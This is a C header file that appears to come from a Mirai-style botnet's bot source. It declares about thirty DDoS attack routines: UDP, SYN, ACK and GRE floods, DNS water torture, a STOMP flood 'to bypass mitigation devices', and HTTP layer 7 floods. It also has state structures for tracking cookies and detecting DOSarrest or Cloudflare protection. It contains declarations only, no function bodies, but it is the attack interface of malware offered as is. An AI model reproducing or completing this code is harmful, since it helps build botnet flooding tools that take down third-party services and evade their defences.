#pragma once

#include <time.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/tcp.h>

#include "includes.h"
#include "protocol.h"

#define ATTACK_CONCURRENT_MAX   15

#ifdef DEBUG
#define HTTP_CONNECTION_MAX     1000
#else
#define HTTP_CONNECTION_MAX     256
#endif

struct attack_target {
    struct sockaddr_in sock_addr;
    ipv4_t addr;
    uint8_t netmask;
};

struct attack_option {
    char *val;
    uint8_t key;
};

typedef void (*ATTACK_FUNC) (uint8_t, struct attack_target *, uint8_t, struct attack_option *);
typedef uint8_t ATTACK_VECTOR;

#define ATK_VEC_UDP        0  /* Straight up UDP flood */
#define ATK_VEC_VSE        1  /* Valve Source Engine query flood */
#define ATK_VEC_DNS        2  /* DNS water torture */
#define ATK_VEC_SYN        3  /* SYN flood with options */
#define ATK_VEC_ACK        4  /* ACK flood */
#define ATK_VEC_STOMP      5  /* ACK flood to bypass mitigation devices */
#define ATK_VEC_GREIP      6  /* GRE IP flood */
#define ATK_VEC_GREETH     7  /* GRE Ethernet flood */
#define ATK_VEC_UDP_PLAIN  9  /* Plain UDP flood optimized for speed */
#define ATK_VEC_HTTP       10 /* HTTP layer 7 flood */
#define ATK_VEC_YSYNACK    11
#define ATK_VEC_LYNX       12
#define ATK_VEC_XMAS       13
#define ATK_VEC_UDPHEX     14    
#define ATK_VEC_OVHHEX     15
#define ATK_VEC_PSH        16
#define ATK_VEC_STDHEX     17
#define ATK_VEC_NFO        18
#define ATK_VEC_OVH2       19
#define ATK_VEC_HTTPNULL   20
#define ATK_VEC_CFNULL     21
#define ATK_VEC_HEX        22
#define ATK_VEC_STD        23
#define ATK_VEC_STD2       24
#define ATK_VEC_XMAS2      25
#define ATK_VEC_TCPUDP     26
#define ATK_VEC_UDPPUSH    27
#define ATK_VEC_UDPSTR     28
#define ATK_VEC_STDHEX2    29
#define ATK_VEC_HEX2       30

#define ATK_OPT_PAYLOAD_SIZE    0
#define ATK_OPT_PAYLOAD_RAND    1
#define ATK_OPT_IP_TOS          2
#define ATK_OPT_IP_IDENT        3
#define ATK_OPT_IP_TTL          4
#define ATK_OPT_IP_DF           5
#define ATK_OPT_SPORT           6
#define ATK_OPT_DPORT           7
#define ATK_OPT_DOMAIN          8
#define ATK_OPT_DNS_HDR_ID      9
#define ATK_OPT_URG             11
#define ATK_OPT_ACK             12
#define ATK_OPT_PSH             13
#define ATK_OPT_RST             14
#define ATK_OPT_SYN             15
#define ATK_OPT_FIN             16
#define ATK_OPT_SEQRND          17
#define ATK_OPT_ACKRND          18
#define ATK_OPT_GRE_CONSTIP     19
#define ATK_OPT_SOURCE          20

#define ATK_OPT_POST_DATA       21
#define ATK_OPT_METHOD          22
#define ATK_OPT_PATH            23
#define ATK_OPT_CONNS           24
#define HTTP_CONN_INIT          25

#define TABLE_HTTP_ONE          26
#define TABLE_HTTP_TWO          27 
#define TABLE_HTTP_THREE        28
#define TABLE_HTTP_FOUR         29
#define TABLE_HTTP_FIVE         30
#define TABLE_HTTP_SIX          31
#define TABLE_HTTP_SEVEN        32
#define TABLE_HTTP_EIGHT        33
#define TABLE_HTTP_NINE         34
#define TABLE_HTTP_TEN          35
#define TABLE_HTTP_ELEVEN       36
#define TABLE_HTTP_TWELVE       37
#define TABLE_HTTP_THIRTEEN     38
#define TABLE_HTTP_FOURTEEN     39
#define TABLE_HTTP_FIVETEEN     40
#define TABLE_HTTP_SIXTEEN      41
#define TABLE_HTTP_SEVENTEEN    42
#define TABLE_HTTP_EIGHTEEN     43
#define TABLE_HTTP_NINETEEN     44
#define TABLE_HTTP_TWENTY       45

#define HTTP_CONN_RESTART       46
#define HTTP_CONN_SEND          47
#define HTTP_CONN_CONNECTING    48

#define TABLE_ATK_KEEP_ALIVE    49
#define TABLE_ATK_ACCEPT        50
#define TABLE_ATK_ACCEPT_LNG    51
#define TABLE_ATK_CONTENT_TYPE  52
#define HTTP_CONN_RECV_HEADER   53
#define HTTP_CONN_RECV_BODY     54
#define HTTP_CONN_QUEUE_RESTART 55
#define HTTP_CONN_CLOSED        56

#define TABLE_ATK_RESOLVER      67
#define TABLE_ATK_NSERV         68

#define ATK_OPT_PD1             69
#define ATK_OPT_LENPD1          70
#define MAXFD_SEND              71

#define HTTP_RDBUF_SIZE         1024
#define HTTP_HACK_DRAIN         64
#define HTTP_PATH_MAX           256
#define HTTP_DOMAIN_MAX         128
#define HTTP_COOKIE_MAX         5   // no more then 5 tracked cookies
#define HTTP_COOKIE_LEN_MAX     128 // max cookie len
#define HTTP_POST_MAX           512 // max post data len

#define HTTP_PROT_DOSARREST     1 // Server: DOSarrest
#define HTTP_PROT_CLOUDFLARE    2 // Server: cloudflare-nginx

struct attack_method {
    ATTACK_FUNC func;
    ATTACK_VECTOR vector;
};

struct attack_stomp_data {
    ipv4_t addr;
    uint32_t seq, ack_seq;
    port_t sport, dport;
};

struct attack_lynx_data {
    ipv4_t addr;
    uint32_t seq, ack_seq;
    port_t sport, dport;
};

struct attack_xmas_data {
    ipv4_t addr;
    uint32_t seq, ack_seq;
    port_t sport, dport;
};

struct attack_http_state {
    int fd;
    uint8_t state;
    int last_recv;
    int last_send;
    ipv4_t dst_addr;
    char user_agent[512];
    char path[HTTP_PATH_MAX + 1];
    char domain[HTTP_DOMAIN_MAX + 1];
    char postdata[HTTP_POST_MAX + 1];
    char method[9];
    char orig_method[9];

    int protection_type;

    int keepalive;
    int chunked;
    int content_length;

    int num_cookies;
    char cookies[HTTP_COOKIE_MAX][HTTP_COOKIE_LEN_MAX];

    int rdbuf_pos;
    char rdbuf[HTTP_RDBUF_SIZE];
};

struct attack_cfnull_state {
    int fd;
    uint8_t state;
    int last_recv;
    int last_send;
    ipv4_t dst_addr;
    char user_agent[512];
    char domain[HTTP_DOMAIN_MAX + 1];
    int to_send;
};

BOOL attack_init(void);
void attack_kill_all(void);
void attack_parse(char *, int);
void attack_start(int, ATTACK_VECTOR, uint8_t, struct attack_target *, uint8_t, struct attack_option *);
char *attack_get_opt_str(uint8_t, struct attack_option *, uint8_t, char *);
int attack_get_opt_int(uint8_t, struct attack_option *, uint8_t, int);
uint32_t attack_get_opt_ip(uint8_t, struct attack_option *, uint8_t, uint32_t);

void attack_udp_generic(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_vse(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_dns(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_plain(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_ovh2(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_xmas(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_udphex(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_psh(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_stdhex(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_lynx(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_ysynack(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_nfo(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_ovhhex(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_hex(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_std(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_std2(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_xmas2(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_tcpudp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_push(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_str(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_stdhex2(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_hex2(uint8_t, struct attack_target *, uint8_t, struct attack_option *);

void attack_tcp_syn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_ack(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_stomp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);

void attack_gre_ip(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_gre_eth(uint8_t, struct attack_target *, uint8_t, struct attack_option *);

void attack_app_proxy(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_app_http(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_app_httpnull(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_app_cfnull(uint8_t, struct attack_target *, uint8_t, struct attack_option *);

static void add_attack(ATTACK_VECTOR, ATTACK_FUNC);
static void free_opts(struct attack_option *, int);
